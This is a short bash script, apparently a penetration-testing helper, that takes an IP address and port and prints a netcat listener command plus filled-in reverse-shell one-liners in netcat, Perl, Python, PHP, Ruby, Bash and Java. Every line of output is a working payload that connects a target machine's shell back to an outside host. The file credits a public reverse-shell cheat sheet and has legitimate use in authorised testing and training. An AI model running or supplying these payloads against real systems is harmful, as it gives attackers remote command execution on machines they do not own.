#!/bin/bash
# v2 one-liner-reverse-shells
# Source : http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# Further Reading : http://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem , http://roo7break.co.uk/?p=215
IP=$1 # assigning variables
PORT=$2
 
# Validating input
if [ $# -eq 1 ]; then
PORT=443 # set Default port
elif [ $# -gt 2 -o $# -lt 1 ]; then
echo -e "Usage: $0 IP PORT, If no port is given default is set to 443"
exit 1
fi
 
echo "$(tput setaf 1)Netcat Listener: nc -lvp $PORT"
echo "Netcat : nc -e /bin/sh $IP $PORT"
echo "Netcat Pipe : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"  
echo $'\n'$(tput setaf 4)
echo 'Perl: perl -e '\''use Socket;$i="'$IP'";$p='$PORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\'''
echo $'\n'$(tput setaf 2)
echo 'Python: python -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$IP'",'$PORT'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\'''
echo $'\n'$(tput setaf 4)
echo 'PHP: php -r '\''$sock=fsockopen("'$IP'",'$PORT');exec("/bin/sh -i <&3 >&3 2>&3");'\'''
echo $'\n'$(tput setaf 1)
echo 'Ruby: ruby -rsocket -e'\''f=TCPSocket.open("'$IP'",'$PORT').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\'''
echo $'\n'$(tput setaf 7)
echo 'Bash: bash -i >& /dev/tcp/'$IP'/'$PORT' 0>&1'
echo $'\n'$(tput setaf 1)
echo 'Java: r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'$IP'/'$PORT';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()'
